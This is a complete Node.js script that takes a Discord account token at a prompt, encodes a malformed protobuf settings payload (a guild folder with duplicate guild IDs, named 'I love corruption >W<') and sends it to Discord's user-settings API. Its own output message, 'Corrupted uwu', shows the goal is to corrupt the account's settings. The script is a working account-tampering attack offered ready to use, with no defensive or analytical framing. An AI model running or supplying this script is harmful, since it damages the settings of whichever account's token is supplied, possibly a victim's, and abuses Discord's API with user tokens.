const protobuf = require('protobufjs');
const axios = require('axios');
const Long = require('long');
const readline = require("readline-sync");
// Discord token
var DISCORD_TOKEN = readline.question("Input a Discord Token:\n");
console.log("Discord Token:", DISCORD_TOKEN);
(async () => {
    const root = await protobuf.load("usersettings.proto");
    const UserSettings = root.lookupType("UserSettings");
    const settingsPayload = {
        guildFolders: [
            {
                id: 1,
                guildIds: [
                    Long.fromString('123456789012345678'),
                    Long.fromString('123456789012345678')
                ],
                name: 'I love corruption >W<',
                color: 0xff0000
            }
        ]
    };
    const errMsg = UserSettings.verify(settingsPayload);
    if (errMsg) throw Error(errMsg);
    const message = UserSettings.create(settingsPayload);
    const buffer = UserSettings.encode(message).finish();
    const base64Settings = Buffer.from(buffer).toString('base64');
    const payload = {
        settings: base64Settings
    };
    try {
        const response = await axios.patch(
            'https://discord.com/api/v9/users/@me/settings-proto/1',
            payload,
            {
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': DISCORD_TOKEN
                }
            }
        );
        console.log('Corrupted uwu: ', response.data);
    } catch (error) {
        console.error('Error ): :', error.response ? error.response.data : error.message);
    }
})();
